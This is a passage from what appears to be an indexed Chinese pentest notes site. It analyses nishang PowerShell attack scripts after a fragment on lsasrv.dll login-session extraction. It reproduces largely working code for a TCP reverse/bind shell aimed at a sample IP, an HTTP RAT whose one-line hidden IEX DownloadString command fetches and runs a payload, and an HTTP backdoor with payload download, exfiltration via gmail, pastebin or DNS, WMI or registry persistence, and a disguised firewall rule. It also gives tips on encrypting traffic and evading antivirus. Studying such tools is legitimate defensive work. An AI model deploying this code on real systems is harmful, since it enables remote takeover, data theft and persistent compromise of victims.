\u7b2c\u4e00\u5c42kull_m_memory_search\u901a\u8fc7sBuffer.result\u4e2d\u7684\u4fe1\u606f\u5f97\u5230\u6267\u884c\u6240\u627e\u5230\u7684\u533a\u57df\u7684\u6307\u9488\uff0c\u7136\u540e\u5c06\u8be5\u6307\u9488\u4f20\u51fa\u6765\u653e\u5230sMemory.result\u91cc\uff0c\u518d\u7531\u4e00\u7cfb\u5217\u53d8\u5316\u83b7\u5f97\u6307\u5411\u767b\u9646\u4ee4\u724c\u7684\u6307\u9488","title":"\u901a\u8fc7lsasrv.dll\u83b7\u53d6\u767b\u5f55\u4f1a\u8bdd"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/","text":"powershell\u811a\u672c\u7684\u5206\u6790 \u76ee\u5f55 \u7b51\u57fa CmdletBinding \u53c2\u6570\u96c6 nishang Shells Invoke-powershelltcp Invoke-PoshRatHttp backdoor Http-Backdoor Gather Get-WebCredentials powerview Get-NetSession \u53c2\u6570 \u5177\u4f53\u903b\u8f91 Get-NetLoggedon \u5177\u4f53\u903b\u8f91 Find-DomainUserLocation \u5177\u4f53\u903b\u8f91 \u7b51\u57fa CmdletBinding CmdletBinding \u5f80\u5f80\u51fa\u73b0\u5728ps\u4e2d\u4e00\u4e2a\u51fd\u6570\u7684\u5f00\u5934\uff0c\u7528\u4e8e\u53c2\u6570\u5904\u7406\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u4e00\u4e2aps\u51fd\u6570\u662f\u8fd9\u6837\u6765\u8bbe\u7f6e\u53c2\u6570\u7684\u3002\uff08\u5f53\u7136\u4e5f\u53ef\u4ee5\u7528\u6700\u6734\u5b9e\u7684 function foo($a,$b,\\$c) \u6765\u5b9e\u73b0\u53c2\u6570\uff09 function Get-Version{ param ( $ComputerName ) Write-Output $ComputerName } \u610f\u601d\u5c31\u662f\u63a5\u6536ComputerName\u53c2\u6570\uff0c\u8f93\u51faComputerName\u53c2\u6570\u3002 Get-Version -ComputerName aa >aa \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7Get-Command\u6307\u4ee4\u6765\u770b\u6b64\u51fd\u6570\u652f\u6301\u54ea\u4e9b\u53c2\u6570\u3002 PS C:\\Users\\14216\\Desktop> (Get-Command -name Get-Version).Parameters.Keys ComputerName \u53d1\u73b0\u5b83\u53ea\u652f\u6301ComputerName\u53c2\u6570\uff0c\u56e0\u4e3a\u6211\u4eec\u5728param\u4e2d\u53ea\u8bbe\u7f6e\u4e86ComputerName\u53c2\u6570\u3002 \u4f46\u662fpowershell\u4e2d\u662f\u5b58\u5728\u6709\u8bb8\u591a\u901a\u7528\u53c2\u6570(CommonParameters)\u7684\u3002 \u901a\u7528\u53c2\u6570\u5982 -verbose(\u663e\u793a\u547d\u4ee4\u6240\u6267\u884c\u64cd\u4f5c\u7684\u8be6\u7ec6\u4fe1\u606f)\uff0c-debug(\u663e\u793a\u6709\u5173\u547d\u4ee4\u5b8c\u6210\u7684\u64cd\u4f5c\u7684\u7a0b\u5e8f\u5458\u7ea7\u8be6\u7ec6\u4fe1\u606f)\u7b49\u3002 \u50cf\u4e0a\u9762\u90a3\u6837\u5b9a\u4e49\u51fd\u6570\u53c2\u6570\uff0c\u662f\u4e0d\u80fd\u8ba9\u51fd\u6570\u63a5\u6536\u901a\u7528\u53c2\u6570\u7684\uff0c\u60f3\u8981\u63a5\u6536\u901a\u7528\u53c2\u6570\uff0c\u53ea\u9700\u5728param\u524d\u52a0\u4e0a [CmdletBinding()]\u5373\u53ef\uff0c\u5982\u4e0b function Get-Version{ [CmdletBinding()] param ( $ComputerName ) Write-Output $ComputerName } \u6b64\u65f6\u8be5\u51fd\u6570\u5c31\u53d8\u6210\u4e86\u201c\u9ad8\u7ea7\u51fd\u6570\u201d\uff0c\u6211\u4eec\u518d\u901a\u8fc7Get-Command\u53c2\u6570\u5373\u53ef\u770b\u51fa\u5b83\u652f\u6301\u4e86\u901a\u7528\u53c2\u6570 PS C:\\Users\\14216\\Desktop> (Get-Command -name Get-Version).Parameters.Keys ComputerName Verbose Debug ErrorAction WarningAction InformationAction ErrorVariable WarningVariable InformationVariable OutVariable OutBuffer PipelineVariable \u53c2\u6570\u96c6 \u901a\u8fc7\u4e3a\u51fd\u6570\u8bbe\u7f6e\u53c2\u6570\u96c6\uff0c\u53ef\u4ee5\u4f7f\u51fd\u6570\u5728\u4e0d\u540c\u573a\u666f\u4e0b\u6267\u884c\u4e0d\u540c\u7684\u64cd\u4f5c\u3002 \u8981\u521b\u5efa\u53c2\u6570\u96c6\uff0c\u60a8\u5fc5\u987b\u4e3a\u53c2\u6570\u96c6\u4e2d\u7684\u6bcf\u4e2a\u53c2\u6570\u6307\u5b9a Parameter \u5c5e\u6027\u7684 ParameterSetName \u5173\u952e\u5b57\u3002\u5bf9\u4e8e\u5c5e\u4e8e\u591a\u4e2a\u53c2\u6570\u96c6\u7684 \u53c2\u6570\uff0c \u4e3a\u6bcf\u4e2a\u53c2\u6570\u96c6\u6dfb\u52a0\u4e00\u4e2a Parameter \u5c5e\u6027\u3002\u6ca1\u6709\u6307\u5b9a\u53c2\u6570\u96c6\u540d\u79f0\u7684\u53c2\u6570\u5c5e\u4e8e\u6240\u6709\u53c2\u6570\u96c6\u3002 \u8fd9\u91cc\u9009\u53d6\u5fae\u8f6f\u5b98\u65b9\u7ed9\u51fa\u7684\u4f8b\u5b50. DefaultParameterSetName \u6307\u5b9a\u9ed8\u8ba4\u91c7\u7528\u7684\u53c2\u6570\u96c6 Mandatory \u6307\u5b9a\u8fd9\u4e2a\u53c2\u6570\u5728\u6b64\u53c2\u6570\u96c6\u4e2d\u662f\u5426\u4e3a\u5f3a\u5236\u7684 ParameterSetName \u6307\u5b9a\u53c2\u6570\u6240\u5c5e\u53c2\u6570\u96c6 [CmdletBinding(DefaultParameterSetName = 'Path')] param ( [Parameter(Mandatory = $true, ParameterSetName = 'Path', HelpMessage = 'Enter one or more filenames', Position = 0)] [Parameter(Mandatory = $true, ParameterSetName = 'PathAll', Position = 0)] [string[]]$Path, [Parameter(Mandatory = $true, ParameterSetName = 'LiteralPathAll')] [Parameter(Mandatory = $true, ParameterSetName = 'LiteralPath', HelpMessage = 'Enter a single filename', ValueFromPipeline = $true)] [string]$LiteralPath, [Parameter(ParameterSetName = 'Path')] [Parameter(ParameterSetName = 'LiteralPath')] [switch]$Lines, [Parameter(ParameterSetName = 'Path')] [Parameter(ParameterSetName = 'LiteralPath')] [switch]$Words, [Parameter(ParameterSetName = 'Path')] [Parameter(ParameterSetName = 'LiteralPath')] [switch]$Characters, [Parameter(Mandatory = $true, ParameterSetName = 'PathAll')] [Parameter(Mandatory = $true, ParameterSetName = 'LiteralPathAll')] [switch]$All, [Parameter(ParameterSetName = 'Path')] [Parameter(ParameterSetName = 'PathAll')] [switch]$Recurse ) nishang Shells Shells\u6a21\u5757\u4e3b\u8981\u662f\u7528\u6765\u5f39shell\u7684\u3002 Invoke-powershelltcp \u8fd9\u4e2afunction\u7684\u4f5c\u7528\u662f\uff0c\u901a\u8fc7tcp\u8fdb\u884c\u8fdeshell\u64cd\u4f5c\u3002 \u6b63\u8fdeshell Invoke-powershelltcp -bind -port 10086 \u53cd\u5f39shell Invoke-powershelltcp -reverse -ipaddress 123.123.123.123 -port 10086 ** \u53c2\u6570 ** [CmdletBinding(DefaultParameterSetName=\"reverse\")] Param( [Parameter(Position = 0, Mandatory = $true, ParameterSetName=\"reverse\")] [Parameter(Position = 0, Mandatory = $false, ParameterSetName=\"bind\")] [String] $IPAddress, [Parameter(Position = 1, Mandatory = $true, ParameterSetName=\"reverse\")] [Parameter(Position = 1, Mandatory = $true, ParameterSetName=\"bind\")] [Int] $Port, [Parameter(ParameterSetName=\"reverse\")] [Switch] $Reverse, [Parameter(ParameterSetName=\"bind\")] [Switch] $Bind ) \u53ef\u4ee5\u5f88\u8f7b\u677e\u53d1\u73b0\u6709\u4e24\u4e2a\u53c2\u6570\u96c6\u5206\u522b\u5bf9\u5e94\u76d1\u542c\u53cd\u5f39shell\u548c\u76f4\u63a5\u53cd\u5f39shell\u3002 \u5177\u4f53\u903b\u8f91 \u5728\u4ee3\u7801\u903b\u8f91\u5f00\u7aef\uff0c\u5148\u901a\u8fc7\u53c2\u6570\u5224\u65ad\u81ea\u8eab\u884c\u4e3a\u662f\u53cd\u5f39\u8fd8\u662f\u76d1\u542c\u3002 \u5982\u679c\u662f\u53cd\u5f39shell\uff0c\u5219\u4e0e\u6307\u5b9aIP\u7aef\u53e3\u8fdb\u884c\u94fe\u63a5\u3002System.Net.Sockets.TCPClient\uff1a https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient?view=net-5.0 \u5982\u679c\u662f\u6b63\u8fdeshell\uff0c\u5219\u4e8e\u6307\u5b9a\u7aef\u53e3\u5f00\u542f\u76d1\u542c\u5e76\u7b49\u5f85\u94fe\u63a5\u3002System.Net.Sockets.TcpListenerhttps\\://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcplistener?view=net-5.0 if ($Reverse) { $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port) } #Bind to the provided port if Bind switch is used. if ($Bind) { $listener = [System.Net.Sockets.TcpListener]$Port $listener.start() $client = $listener.AcceptTcpClient() } \u5728\u83b7\u53d6\u8fde\u63a5\u540e\uff0c\u83b7\u53d6TcpClient\u7684stream\u6d41\u7528\u4e8e\u8bfb\u5199\u6570\u636e\u3002\u7136\u540e\u901a\u8fc7stream\u6d41\u53d1\u9001\u8d77\u59cb\u7684\u4fe1\u606f\u3002 $stream = $client.GetStream() [byte[]]$bytes = 0..65535|%{0} //\u83b7\u53d6\u4e00\u4e2a\u957f\u5ea6\u4e3a65535\u88ab0\u586b\u5145\u7684\u5b57\u8282\u6570\u636e\uff0c\u7528\u4e8e\u540e\u6765\u7684TCP\u6570\u636e\u4ea4\u6362 #Send back current username and computername $sendbytes = ([text.encoding]::ASCII).GetBytes(\"Windows PowerShell running as user \" + $env:username + \" on \" + $env:computername + \"`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n\") $stream.Write($sendbytes,0,$sendbytes.Length) #Show an interactive PowerShell prompt $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>') $stream.Write($sendbytes,0,$sendbytes.Length) \u968f\u540e\u4fbf\u662f\u5904\u7406\u6d88\u606f\u4f20\u9012\u4e0e\u547d\u4ee4\u6267\u884c while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) //\u76d1\u542c\u94fe\u63a5\u4f20\u6765\u7684\u8baf\u606f { $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding $data = $EncodedText.GetString($bytes,0, $i) //$data\u4e3a\u8fdc\u7a0b\u4f20\u6765\u7684\u4fe1\u606f\uff0c\u4e00\u822c\u4e3a\u547d\u4ee4 try { #Execute the command on the target. $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String ) //\u6b64\u53d8\u91cf\u5b58\u50a8\u547d\u4ee4\u6267\u884c\u7684\u7ed3\u679c } catch { Write-Warning \"Something went wrong with execution of command on the target.\" Write-Error $_ } $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ' $x = ($error[0] | Out-String) //\u9519\u8bef\u4fe1\u606f $error.clear() $sendback2 = $sendback2 + $x #Return the results $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2) $stream.Write($sendbyte,0,$sendbyte.Length) //\u8fd4\u56de\u4fe1\u606f $stream.Flush() } \u600e\u6837\u4f18\u5316\uff1f \u53ef\u4ee5\u5bf9\u6d41\u91cf\u8fdb\u884c\u4e00\u6b65\u4f18\u5316\uff1a\u5bf9stream\u4e2d\u7684IO\u5957\u7528\u52a0\u89e3\u5bc6\uff0c\u4e00\u65b9\u9762\u662f\u7ed9\u4fe1\u606f\u4f20\u56de\u5957\u52a0\u5bc6\uff0c\u53e6\u4e00\u65b9\u9762\u662f\u7ed9\u6307\u4ee4\u53d1\u653e\u5957\u52a0\u5bc6\uff08\u8fd9\u4e00\u6b65\u9700\u8981\u63a7\u5236\u7aef\u989d\u5916\u7f16\u5199\u52a0\u5bc6\u6307\u4ee4\u53d1\u9001\u5de5\u5177\uff09 Invoke-PoshRatHttp Invoke-PoshRatHttp\u662f\u4e00\u4e2a\u57fa\u4e8eHTTP\u7684\u5f39shell\u5de5\u5177 \u5b83\u7684\u5927\u81f4\u903b\u8f91\u4e3a\uff1a1.\u672c\u5730\u76d1\u542c\u7aef\u53e3\uff0c\u751f\u6210\u4e00\u6bb5powershell\u8fdc\u7a0b\u52a0\u8f7d\u6307\u4ee4 2.\u5728\u76ee\u6807\u673a\u5668\u4e0a\u6267\u884cpowershell\u8fdc\u7a0b\u52a0\u8f7d\u6307\u4ee4\uff0c\u4f7f\u5176\u6267\u884c\u53e6\u4e00\u4e2aURL\u4e0aHTTP\u4f20\u56de\u7684\u547d\u4ee4\uff0c\u5e76\u901a\u8fc7POST\u5411\u6b64URL\u4f20\u56de\u547d\u4ee4\u6267\u884c\u7ed3\u679c \u5b98\u65b9\u63cf\u8ff0(\u6b64\u811a\u672c\u8fd8\u53ef\u901a\u8fc7hta\u6267\u884c\u547d\u4ee4\uff0c\u4e0d\u8fc7\u672c\u6587\u5c31\u4e0d\u8d58\u8ff0\u4e86) This script starts a listener on the attacker's machine. The listener needs a port to listen. On the target machine execute the below command from PowerShell: iex (New-Object Net.WebClient).DownloadString(\"http://ListenerIPAddress/connect\") or trick a user in connecting to: http://ListenerIPAddress/WindowsDefender.hta The listener opens incoming traffic on the specified port by the name of \"Windows Update HTTP\". The listener needs to be run from an elevated PowerShell session. The script has been originally written by Casey Smith (@subTee) \u53c2\u6570 \u53c2\u6570\u90e8\u5206\u6ca1\u4ec0\u4e48\u8bf4\u7684\uff0c\u5c31\u662f\u6307\u5b9a\u672c\u5730IP\u4e0e\u7aef\u53e3\u800c\u5df2 [CmdletBinding()] Param( [Parameter(Position = 0, Mandatory = $true)] [String] $IPAddress, [Parameter(Position = 1, Mandatory = $true)] [Int] $Port ) \u5177\u4f53\u903b\u8f91 \u811a\u672c\u5f00\u59cb\u8fd0\u884c\u540e\u4f1a\u76d1\u542c\u672c\u5730\u7aef\u53e3\uff0c\u5e76\u6839\u636e\u4f20\u5165\u7684ipaddress\u548cport\u751f\u6210powershell\u4e00\u53e5\u8bdd\u6307\u4ee4\uff0c\u6267\u884c\u8be5\u6307\u4ee4\u4f1a\u4f7f\u7528\u6237\u6267\u884c\u8fdc\u7a0bURL\u5f97\u5230\u7684payload $listener = New-Object System.Net.HttpListener $listener.Prefixes.Add(\"http://+:$Port/\") #Create Firewall Rules netsh advfirewall firewall delete rule name=\"WindowsUpdate HTTP\" | Out-Null netsh advfirewall firewall add rule name=\"WindowsUpdate HTTP\" dir=in action=allow protocol=TCP localport=$Port | Out-Null $listener.Start() Write-Output \"Listening on $IPAddress`:$Port\" Write-Output \"Run the following command on the target:\" Write-Output \"powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('http://$IPAddress`:$Port/connect'))\" \u968f\u540e\u901a\u8fc7\u4e00\u4e2a\u5927\u7684while\u5faa\u73af\u76d1\u542c\u5bf9\u6b64\u7aef\u53e3\u53d1\u9001\u7684HTTP\u8bf7\u6c42\u3002 \u5728\u5176\u4e2d\uff0c\u5982\u679c\u76d1\u542c\u5230\u4ee5connect\u7ed3\u5c3e\u7684GET\u8bf7\u6c42\uff0c\u5219\u751f\u6210\u4e00\u6bb5payload\uff0c\u5e76\u5728\u6700\u540eHTTP\u5e94\u7b54\u56de\u53bb\u3002\uff08IEX ((New-Object Net.WebClient).DownloadString \u662f\u4ee5GET\u8bf7\u6c42\u5de5\u4f5c\u7684\uff09 \u5728\u53d7\u5bb3\u8005\u6267\u884chttp\\://.../connect\u5f97\u5230\u7684\u811a\u672c\u540e\uff0c\u4fbf\u4f1a\u6267\u884chttp\\://.../rat\u4f20\u6765\u7684PAYLOAD\uff0c\u5728\u53d7\u5bb3\u673a\u6267\u884c\u4e86http\\://.../rat \u4f20\u56depayload\u540e\uff0c\u4f1a\u901a\u8fc7uploadString\u65b9\u6cd5\u4ee5POST\u65b9\u5f0f\u5c06\u6267\u884c\u7ed3\u679c\u4f20\u56dehttp\\://../rat if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq \"GET\")) { $message = \" `$s = `\"http://$IPAddress`:$Port/rat`\" `$w = New-Object Net.WebClient while(`$true) { [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true} `$r = `$w.DownloadString(`$s) while(`$r) { `$o = invoke-expression `$r | out-string `$w.UploadString(`$s, `$o) break } } \" } ...... [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message) $response.ContentLength64 = $buffer.length $output = $response.OutputStream $output.Write($buffer, 0, $buffer.length) $output.Close() http://.../rat \u7684\u76f8\u5173\u903b\u8f91\u662f\u8fd9\u4e48\u5199\u7684 \u5f53http\\://.../rat \u88ab\u4ee5GET\u65b9\u6cd5\u8bbf\u95ee\u540e\uff0c\u653b\u51fb\u673a\u4f1a\u7b49\u5f85\u7ec8\u7aef\u7684\u8f93\u5165\uff0c\u7136\u540e\u5c06\u5176\u4f5c\u4e3aHTTP\u5e94\u7b54\u4f20\u56de\u3002 \u5f53http\\://.../rat \u88ab\u4ee5POST\u65b9\u6cd5\u8bbf\u95ee\u540e\uff0c\u653b\u51fb\u673a\u5219\u4f1a\u83b7\u53d6\u8be5\u8bf7\u6c42\u5e76\u628a\u8bf7\u6c42\u5185\u5bb9\u8f93\u51fa\u5230\u7ec8\u7aef\u3002\uff08\u4e5f\u5c31\u662f\u8bf4\u4f1a\u628a\u547d\u4ee4\u6267\u884c\u7ed3\u679c\u8fd4\u56de\u5230\u7ec8\u7aef) if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq \"POST\") ) { Receive-Request($request) } if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq \"GET\")) { $response.ContentType = 'text/plain' $message = Read-Host \"PS $hostip>\" #If the Server/Attacker uses the exit command. Close the client part and the server. if ($message -eq \"exit\") { [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message) $response.ContentLength64 = $buffer.length $output = $response.OutputStream $output.Write($buffer, 0, $buffer.length) $output.Close() $listener.Stop() break } } \u00b7\u00b7\u00b7\u00b7 [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message) $response.ContentLength64 = $buffer.length $output = $response.OutputStream $output.Write($buffer, 0, $buffer.length) $output.Close() \u600e\u4e48\u4f18\u5316\uff1f powershell\u8fdc\u7a0b\u811a\u672c\u514d\u6740\u8981\u505a\u597d\uff0c\u4e0d\u7136\u6839\u672c\u4e0d\u53ef\u80fd\u8fc7AV IO\u5957\u52a0\u5bc6 backdoor Http-Backdoor Http-Backdoor\u662f\u4e00\u4e2a\u57fa\u4e8eHTTP\u7684\u540e\u95e8\u7a0b\u5e8f\u3002 \u5b83\u7684\u5927\u81f4\u903b\u8f91\u662f\u5b9a\u65f6\u8bbf\u95ee\u7279\u5b9aURL\uff08targeturl\uff09\u82e5URL\u8fd4\u56de\u7279\u5b9a\u503c\u5219\u4ece\u53e6\u4e00\u4e2a\u6307\u5b9aURL\uff08payloadurl\uff09\u4e0b\u8f7dpayload\u6587\u4ef6\u5e76\u6267\u884c\u3002 \u53c2\u6570 [CmdletBinding(DefaultParameterSetName=\"noexfil\")] Param( [Parameter(Parametersetname=\"exfil\")] [Switch] $persist, //\u662f\u5426\u505a\u6301\u4e45\u5316 [Parameter(Parametersetname=\"exfil\")] [Switch] $exfil, //\u662f\u5426\u6570\u636e\u56de\u663e [Parameter(Position = 0, Mandatory = $True, Parametersetname=\"exfil\")] [Parameter(Position = 0, Mandatory = $True, Parametersetname=\"noexfil\")] [String] $CheckURL, //\u4ece\u54ea\u4e2aURL\u68c0\u6d4b\u5f00\u59cb\u6807\u5fd7\u548c\u7ed3\u675f\u6807\u5fd7 [Parameter(Position = 1, Mandatory = $True, Parametersetname=\"exfil\")] [Parameter(Position = 1, Mandatory = $True, Parametersetname=\"noexfil\")] [String] $PayloadURL, //\u4ece\u54ea\u4e2aURL\u4e0b\u8f7dPAYLOAD [Parameter(Position = 2, Mandatory = $False, Parametersetname=\"exfil\")] [Parameter(Position = 2, Mandatory = $False, Parametersetname=\"noexfil\")] [String] $Arguments = \"Out-Null\", //\u989d\u5916\u7684\u9644\u52a0\u6307\u4ee4\uff0c\u4f1a\u5728\u6728\u9a6c\u5de5\u4f5c\u65f6\u8fd0\u884c [Parameter(Position = 3, Mandatory = $True, Parametersetname=\"exfil\")] [Parameter(Position = 3, Mandatory = $True, Parametersetname=\"noexfil\")] [String] $MagicString, //\u4ecetargeturl\u83b7\u53d6\u5230\u8be5\u6807\u5fd7\u540e\u4ecePayloadUrl\u4e0b\u8f7dpayload\u6267\u884c [Parameter(Position = 4, Mandatory = $True, Parametersetname=\"exfil\")] [Parameter(Position = 4, Mandatory = $True, Parametersetname=\"noexfil\")] [String] $StopString, //\u4ecetargeturl\u83b7\u53d6\u5230\u8be5\u6807\u5fd7\u540e\u7ed3\u675f\u540e\u95e8\u5de5\u4f5c [Parameter(Position = 5, Mandatory = $False, Parametersetname=\"exfil\")] [ValidateSet(\"gmail\",\"pastebin\",\"WebServer\",\"DNS\")] [String] $ExfilOption, //\u6570\u636e\u56de\u663e\u7684\u65b9\u5f0f //\u4ee5\u4e0b\u53c2\u6570\u4e3a\u6570\u636e\u56de\u663e\u7684\u4e00\u4e9b\u53c2\u6570 [Parameter(Position = 6, Mandatory = $False, Parametersetname=\"exfil\")] [String] $dev_key = \"null\", [Parameter(Position = 7, Mandatory = $False, Parametersetname=\"exfil\")] [String] $username = \"null\", [Parameter(Position = 8, Mandatory = $False, Parametersetname=\"exfil\")] [String] $password = \"null\", [Parameter(Position = 9, Mandatory = $False, Parametersetname=\"exfil\")] [String] $URL = \"null\", [Parameter(Position = 10, Mandatory = $False, Parametersetname=\"exfil\")] [String] $DomainName = \"null\", [Parameter(Position = 11, Mandatory = $False, Parametersetname=\"exfil\")] [String] $AuthNS = \"null\" ) \u53c2\u6570\u8fd8\u662f\u6709\u5f88\u591a\u7684\uff0c\u4f46\u53ea\u5bf9\u5e94\u4e24\u4e2a\u53c2\u6570\u96c6exfil\uff08\u6709\u6570\u636e\u56de\u663e\uff09\uff0c\u548cnoexfil\uff08\u65e0\u6570\u636e\u56de\u663e\uff09 \u5177\u4f53\u903b\u8f91 \u5728\u4ee3\u7801\u4e3b\u4f53\u7684\u5f00\u59cb\uff0c\u5b9a\u4e49\u4e86\u4e24\u4e2a\u53d8\u91cf\uff08$body\u548c$exfiltration\uff09\u4ee5\u5b57\u7b26\u4e32\u5f62\u5f0f\u5b58\u653e\u540e\u95e8\u672c\u4f53\u51fd\u6570\uff08HTTP-Backdoor-Logic\uff09\u548c\u540e\u95e8\u6570\u636e\u5e26\u51fa\u51fd\u6570\uff08Do-Exfiltration-HTTP\uff09\uff0c\u6211\u4eec\u7a0d\u540e\u6765\u5206\u6790\u4ed6\u4eec\u4fe9\u3002 \u53ef\u4ee5\u770b\u5230\u5728\u4ee3\u7801\u5f00\u59cb\u8fd0\u884c\u65f6\uff0c\u4f1a\u68c0\u6d4b\u662f\u5426\u6709persist\u53c2\u6570\uff0c\u8fdb\u800c\u51b3\u5b9a\u662f\u5426\u505a\u6301\u4e45\u5316\u5de5\u4f5c\uff0c\u6301\u4e45\u5316\u7684\u76f8\u5173\u4ee3\u7801\u6211\u4eec\u7a0d\u540e\u8ba8\u8bba\u3002 \u5148\u6765\u770bpersist\u4e3aflase\u65f6\uff0c\u4f1a\u56e0exfil\u53c2\u6570\u662f\u5426\u5b58\u5728\u800c\u5206\u60c5\u51b5\u5b9a\u4e49\u4e00\u4e2a\u5b57\u7b26\u4e32\u53d8\u91cf$options\uff0c\u5199\u5165 \u8c03\u7528\u6728\u9a6c\u7684 \u4ee3\u7801\u3002 \u968f\u540e\u5c06HTTP-Backdoor-Logic\uff08\u5bf9\u5e94$body\uff09\u548cDo-Exfiltration-HTTP\uff08\u5bf9\u5e94$exfiltration\uff09\u4ee5\u53ca\u8c03\u7528\u6728\u9a6c\u7684\u4ee3\u7801$options \u5199\u5165\u4e00\u4e2a\u6587\u4ef6\uff0c\u5e76\u6267\u884c\u3002 $modulename = \"HTTP-Backdoor.ps1\" if($persist -eq $True) { //\u6301\u4e45\u5316\u5de5\u4f5c\uff0c\u6211\u4eec\u7a0d\u540e\u6765\u8ba8\u8bba\u6b64\u5904 else { $options = \"HTTP-Backdoor-Logic $CheckURL $PayloadURL $Arguments $MagicString $StopString\" if ($exfil -eq $True) { $options = \"HTTP-Backdoor-Logic $CheckURL $PayloadURL $Arguments $MagicString $StopString $ExfilOption $dev_key $username $password $URL $DomainName $AuthNS $exfil\" } if(1 -eq 1){ } Out-File -InputObject $body -Force $env:TEMP\\$modulename Out-File -InputObject $exfiltration -Append $env:TEMP\\$modulename Out-File -InputObject $options -Append $env:TEMP\\$modulename Invoke-Expression $env:TEMP\\$modulename } } \u968f\u540e\u6211\u4eec\u518d\u6765\u770b\u770b\\$body \u4e2d\u7684\u5185\u5bb9 \u9996\u5148\u662f\u4e00\u4e2a\u5927\u7684while true\u5faa\u73af\uff0c\u7136\u540e\u4fbf\u662f\u5b9a\u65f6\u83b7\u53d6CheckUrl\u4e0a\u7684\u5185\u5bb9\uff0c\u82e5CheckURL\u4e0a\u7684\u5185\u5bb9\u4e0eMagicString \u4e00\u81f4\uff0c\u5219\u4ecePayloadUrl\u5904\u4e0b\u8f7dpayload\u6267\u884c\u3002 \u968f\u540e\u6267\u884c$Arguments\u53c2\u6570\u6307\u5b9a\u7684\u547d\u4ee4\uff0c\u518d\u7136\u540e\u5224\u5b9a$exfil\u53c2\u6570\u662f\u5426\u5b58\u5728\u800c\u662f\u5426\u505a\u51fa\u6570\u636e\u5916\u5e26\u884c\u4e3a\u3002 \u7136\u540e\u8fdb\u516560s\u7684\u4f11\u7720\uff0c\u82e5\u83b7\u53d6CheckUrl\u4e0a\u7684\u5185\u5bb9\u4e3aStopString\u5219\u505c\u6b62\u8fd0\u884c\u7a0b\u5e8f\u3002 $body = @' function HTTP-Backdoor-Logic ($CheckURL, $PayloadURL, $Arguments, $MagicString, $StopString, $ExfilOption, $dev_key, $username, $password, $URL, $DomainName, $AuthNS, $exfil) { while($true) { $exec = 0 start-sleep -seconds 5 $webclient = New-Object System.Net.WebClient $filecontent = $webclient.DownloadString(\"$CheckURL\") $filecontent = $filecontent.TrimEnd() if($filecontent -eq $MagicString) { $script:pastevalue = Invoke-Expression $webclient.DownloadString($PayloadURL) # Check for arguments to the downloaded script. if ($Arguments -ne \"Out-Null\") { $pastevalue = Invoke-Expression $Arguments } $pastevalue $exec++ if ($exfil -eq $True) { $pastename = $env:COMPUTERNAME + \" Results of HTTP Backdoor: \" Do-Exfiltration-HTTP \"$pastename\" \"$pastevalue\" \"$ExfilOption\" \"$dev_key\" \"$username\" \"$password\" \"$URL\" \"$DomainName\" \"$AuthNS\" } if ($exec -eq 1) { Start-Sleep -Seconds 60 } } elseif ($filecontent -eq $StopString) { break } } } '@ \u5173\u4e8e\u6570\u636e\u5916\u5e26\u7684Do-Exfiltration-HTTP\u65b9\u6cd5\u5b9e\u9645\u4e0a\u5e76\u6ca1\u6709\u4ec0\u4e48\u597d\u8bf4\u7684\uff0c\u5b83\u4e3b\u8981\u91c7\u7528\u4e86\u4e09\u79cd\u5916\u5e26\u65b9\u6cd5\uff1a 1\u00b7\u901a\u8fc7\u516c\u5171\u7cfb\u7edf\uff0c\u91c7\u7528\u7279\u5b9aAPI\u4f20\u56de\u6570\u636e\uff0c\u5982\u901a\u8fc7gmail\u53d1\u90ae\u7bb1\u4ee5\u53capastebin\uff08\u7528\u6765\u5728\u7ebf\u5b58\u50a8\u6587\u672c\u7684\u7f51\u7ad9\uff09 2\u00b7\u901a\u8fc7POST\u65b9\u6cd5\u5411\u6307\u5b9aURL\u53d1\u5305\u4f20\u53c2 3\u00b7DNS\u5916\u5e26 \u6211\u4eec\u518d\u6765\u770b\u770b\u5b83\u505a\u7684\u6301\u4e45\u5316\u5427\u3002 \u903b\u8f91\u4e5f\u5f88\u7b80\u5355\uff0c\u5927\u4f53\u5c31\u662f\u5148\u628a\u540e\u95e8\u672c\u4f53\u5199\u5165\u5230\u4e00\u4e2a\u6587\u4ef6\u540e\uff0c\u521b\u5efa\u4e00\u4e2a\u8c03\u7528\u540e\u95e8\u7684VBS\u811a\u672c \u7136\u540e\u5224\u65ad\u5f53\u524d\u7528\u6237\u8eab\u4efd\uff0c\u5982\u679c\u662fAdministrator\u5219\u901a\u8fc7WMI\u7ed1\u5b9aVBS\u811a\u672c\u7559\u540e\u95e8\uff08\u8fc7\u6ee4\u5668\u76d1\u542c\u7528\u6237\u767b\u5f55\uff09 \u4e0d\u662fadministrator\u5c31\u5411\u6ce8\u518c\u8868\u628aVBS\u5199\u5165\u5f00\u673a\u9879\u3002 $name = \"persist.vbs\" $options = \"HTTP-Backdoor-Logic $CheckURL $PayloadURL $Arguments $MagicString $StopString\" if ($exfil -eq $True) { $options = \"HTTP-Backdoor-Logic $CheckURL $PayloadURL $Arguments $MagicString $StopString $ExfilOption $dev_key $username $password $URL $DomainName $AuthNS $exfil\" } Out-File -InputObject $body -Force $env:TEMP\\$modulename Out-File -InputObject 